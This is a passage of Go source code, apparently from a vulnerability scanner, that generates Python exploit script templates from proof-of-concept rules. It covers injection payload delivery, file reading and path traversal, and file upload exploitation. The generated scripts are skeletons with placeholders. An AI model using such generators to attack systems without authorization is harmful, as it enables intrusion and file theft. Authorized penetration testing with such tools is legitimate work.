			sb.WriteString(fmt.Sprintf("        vuln_path = r\"%s\"\n", escapedPath))
		} else {
			sb.WriteString("        vuln_path = \"/\"  # 请填写漏洞路径\n")
		}
		sb.WriteString("        url = urljoin(target, vuln_path)\n")
		sb.WriteString("        # 将payload拼接到注入点(请根据实际情况修改)\n")
		if data.Body != "" {
			escapedBody := strings.ReplaceAll(data.Body, `"`, `\"`)
			escapedBody = strings.ReplaceAll(escapedBody, "\n", `\n`)
			sb.WriteString(fmt.Sprintf("        body = r\"%s\"\n", escapedBody))
			sb.WriteString("        body = body.replace(\"PAYLOAD_HERE\", payload)  # 修改此行\n")
			sb.WriteString("        resp = requests.post(url, headers=HEADERS, data=body, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
		} else {
			sb.WriteString("        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
		}
		sb.WriteString("        print(f\"[+] 响应状态码: {resp.status_code}\")\n")
		sb.WriteString("        print(f\"[+] 响应内容:\\n{resp.text}\")\n")
		sb.WriteString("        return True\n\n")

	case CategoryFileRead, CategoryLFI, CategoryPathTraversal:
		sb.WriteString("        # 将要读取的文件路径嵌入到请求中\n")
		if data.Path != "" {
			sb.WriteString(fmt.Sprintf("        vuln_path = r\"%s\"  # 替换文件路径部分\n", escapedPath))
		} else {
			sb.WriteString("        vuln_path = \"/\"  # 请填写漏洞路径\n")
		}
		sb.WriteString("        # TODO: 将payload(文件路径)替换到路径中的对应位置\n")
		sb.WriteString("        url = urljoin(target, vuln_path)\n")
		sb.WriteString("        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
		sb.WriteString("        if resp.status_code == 200 and len(resp.text) > 0:\n")
		sb.WriteString("            print(f\"[+] 文件读取成功!\")\n")
		sb.WriteString("            print(f\"[+] 文件内容:\\n{resp.text}\")\n")
		sb.WriteString("            return True\n")
		sb.WriteString("        else:\n")
		sb.WriteString("            print(f\"[-] 文件读取失败 (状态码: {resp.status_code})\")\n")
		sb.WriteString("            return False\n\n")

	case CategoryFileUpload:
		sb.WriteString("        # 文件上传利用\n")
		if data.Path != "" {
			sb.WriteString(fmt.Sprintf("        vuln_path = r\"%s\"  # 上传路径\n", escapedPath))
		} else {
			sb.WriteString("        vuln_path = \"/upload\"  # 请填写上传路径\n")
		}
		sb.WriteString("        url = urljoin(target, vuln_path)\n")
		sb.WriteString("        # 构造上传文件\n")
		sb.WriteString("        files = {\n")
		sb.WriteString("            'file': (UPLOAD_FILENAME, payload, 'application/octet-stream')\n")
		sb.WriteString("        }\n")
		sb.WriteString("        resp = requests.post(url, headers=HEADERS, files=files, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
		sb.WriteString("        print(f\"[+] 上传响应状态码: {resp.status_code}\")\n")
		sb.WriteString("        print(f\"[+] 响应内容:\\n{resp.text}\")\n")
		sb.WriteString("        return True\n\n")

	default:
		sb.WriteString("        # 通用利用框架 - 请根据漏洞类型修改\n")
		if data.Path != "" {
			sb.WriteString(fmt.Sprintf("        vuln_path = r\"%s\"\n", escapedPath))
		} else {
			sb.WriteString("        vuln_path = \"/\"  # 请填写漏洞路径\n")
		}
		sb.WriteString("        url = urljoin(target, vuln_path)\n")
		if data.Body != "" && (data.Method == "POST" || data.Method == "PUT") {
			escapedBody := strings.ReplaceAll(data.Body, `"`, `\"`)
			escapedBody = strings.ReplaceAll(escapedBody, "\n", `\n`)
			sb.WriteString(fmt.Sprintf("        body = r\"%s\"\n", escapedBody))
			sb.WriteString(fmt.Sprintf("        resp = requests.%s(url, headers=HEADERS, data=body, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n",
				strings.ToLower(data.Method)))
		} else {
			sb.WriteString("        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
		}
		sb.WriteString("        print(f\"[+] 响应状态码: {resp.status_code}\")\n")
		sb.WriteString("        print(f\"[+] 响应内容:\\n{resp.text}\")\n")
		sb.WriteString("        return True\n\n")
	}
}

// GenerateExpFromPoc 从POC和验证结果直接生成EXP模板 (便捷方法)
func GenerateExpFromPoc(target string, poc *Poc, vulnName string, exploitParams StrMap) {
	if expGenerator == nil {
		return
	}

	// 提取第一条规则的信息作为EXP模板基础
	var method, path, body string
	var headers map[string]string
	var allRules []Rules

	if len(poc.Rules) > 0 {
		rule := poc.Rules[0]
		method = rule.Method
		path = rule.Path
		body = rule.Body
		headers = rule.Headers
		allRules = poc.Rules
	} else if len(poc.Groups) > 0 {
		// 使用匹配到的组的第一条规则
		for _, group := range poc.Groups {
			if group.Key == vulnName || vulnName == "" {
				if len(group.Value) > 0 {
					rule := group.Value[0]
					method = rule.Method
					path = rule.Path
					body = rule.Body
					headers = rule.Headers
					allRules = group.Value
				}
				break
			}
		}
	}

	// 自动分类漏洞
	category := classifyVulnType(poc.Name, allRules)

	data := &ExpTemplateData{
		PocName:       poc.Name,
		VulnName:      vulnName,
		Target:        target,
		Method:        method,
		Path:          path,
		Headers:       headers,
		Body:          body,
		Description:   poc.Detail.Description,
		Author:        poc.Detail.Author,
		Links:         poc.Detail.Links,
		Category:      category,
		ExploitParams: exploitParams,
	}

	if err := expGenerator.GenerateExpTemplate(data); err != nil {
		Common.LogError(fmt.Sprintf("生成EXP脚本模板失败: %v", err))
	}
}
